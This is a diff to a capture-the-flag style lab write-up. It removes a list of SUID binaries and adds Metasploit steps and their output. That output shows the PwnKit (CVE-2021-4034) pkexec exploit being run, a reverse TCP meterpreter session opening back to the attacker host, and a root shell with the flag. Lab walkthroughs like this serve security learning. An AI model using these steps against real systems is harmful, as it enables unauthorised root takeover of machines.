@@ -104,29 +104,42 @@ apache
 - Vulnerable to ``CVE-2021-4034``
 - Exploit suggester ``[CVE-2016-5195] dirtycow``
 
-**SUID - Check easy privesc**
+```shell
+meterpreter > sysinfo
+Computer     : 10.10.16.193
+OS           : CentOS 7.7.1908 (Linux 3.10.0-1062.el7.x86_64)
+Architecture : x64
+BuildTuple   : i486-linux-musl
+Meterpreter  : x86/linux
+```
 
-- /usr/bin/chage                        
-- /usr/bin/gpasswd
-- /usr/bin/chfn  --->  SuSE_9.3/10
-- /usr/bin/chsh
-- /usr/bin/newgrp  --->  HP-UX_10.20
-- /usr/bin/su
-- /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-- /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-- /usr/bin/umount  --->  BSD/Linux(08-1996)
-- /usr/bin/crontab
-- /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-- /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-- /usr/sbin/unix_chkpwd
-- /usr/sbin/pam_timestamp_check
-- /usr/sbin/usernetctl
-- /usr/lib/polkit-1/polkit-agent-helper-1
-- /usr/libexec/dbus-1/dbus-daemon-launch-helper
+4. ``background meterpreter session``
+5. ``search 2021-4034`` and ``use 0``
+
+```shell
+msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > exploit
+
+[*] Started reverse TCP handler on 10.2.127.225:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[!] Verify cleanup of /tmp/.ssbbnl
+[+] The target is vulnerable.
+[*] Writing '/tmp/.ozchxfocjj/corwmy/corwmy.so' (548 bytes) ...
+[!] Verify cleanup of /tmp/.ozchxfocjj
+[*] Sending stage (3020772 bytes) to 10.10.16.193
+[+] Deleted /tmp/.ozchxfocjj/corwmy/corwmy.so
+[+] Deleted /tmp/.ozchxfocjj/.ztjfms
+[+] Deleted /tmp/.ozchxfocjj
+[*] Meterpreter session 2 opened (10.2.127.225:4444 -> 10.10.16.193:48942) at 2022-06-23 16:04:50 -0700
+
+meterpreter > shell
+Process 22448 created.
+Channel 1 created.
+whoami
+root
+```
 
 **What is the root flag?**
 
-
-
+- Get flags with root shell! Was fun!
 
 * * * 
